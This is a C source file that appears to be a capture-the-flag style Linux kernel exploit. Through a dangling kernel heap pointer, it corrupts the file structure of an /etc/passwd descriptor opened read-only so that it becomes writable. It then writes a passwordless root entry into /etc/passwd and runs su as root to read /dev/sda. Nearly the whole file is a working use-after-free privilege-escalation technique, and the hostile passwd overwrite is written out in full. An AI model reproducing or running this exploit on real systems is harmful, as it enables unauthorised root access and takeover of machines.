#include <stdbool.h>
#include <unistd.h>

#include "libs/pwn.h"

/*******************************
 * EXPLOIT                     *
 *******************************/

#define FILE_SIZE 0x100
#define VAL_PATH 0x0008400000000000
#define VAL_RDONLY 0x000a800d00000000
#define VAL_RDWR 0x000f800f00000000
#define VAL_MASK 0x000f000f00000000

/*
 * O_RDONLY          | O_RDWR
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 000000001d804a00  | 000000001f804f00 <- corrupt this line
 * 0100000000000000  | 0100000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 3003a3038088ffff  | 30abaf038088ffff
 * 3003a3038088ffff  | 30abaf038088ffff
 * 0000000000000000  | 0000000000000000
 * 0080000000000000  | 0280000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * c0869c028088ffff  | 40eb93038088ffff
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * ffffffffffffffff  | ffffffffffffffff
 * a0629c028088ffff  | 602187038088ffff
 * 4098d4028088ffff  | 00a0c9028088ffff
 * 102fae028088ffff  | 886047038088ffff
 * 000fa181ffffffff  | 000fa181ffffffff
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 7030ae028088ffff  | e86147038088ffff
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 * 0000000000000000  | 0000000000000000
 */

int main(int argc, char *argv[]) {
  void *ptr;
  bool found;
  int fd;
  uint64_t leak[FILE_SIZE / sizeof(uint64_t)] = {0};
  char clear[FILE_SIZE] = {0};

  lstage("INIT");

  pin_cpu(0, 0);
  rlimit_increase(RLIMIT_NOFILE);
  init();

  lstage("START");

  linfo("created dangeling ptrs");

  ptr = keap_malloc(FILE_SIZE, GFP_KERNEL);
  keap_write(ptr, clear, FILE_SIZE);
  keap_free(ptr);
  linfo("dangeling ptr: %p", ptr);

  fd = SYSCHK(open("/etc/passwd", O_RDONLY));

  keap_read(ptr, leak, FILE_SIZE);

#ifdef DEBUG
  print_hex((char *)leak, FILE_SIZE);
#endif

  linfo("corrupt /etc/passwd to make O_RDWR");
  // is predictable, but this increases successrate
  leak[2] &= ~VAL_MASK;
  leak[2] |= VAL_RDWR & VAL_MASK;

  keap_write(ptr, leak, FILE_SIZE);

  found = false;
  linfo("write to corrupted /etc/passwd");
  SYSCHK(write(fd, "root::0:0:root:/root:/bin/sh\n", 29));

  lstage("Finished! Reading Flag");
  SYSCHK(system("su -c 'cat /dev/sda'"));

  return 0;
}
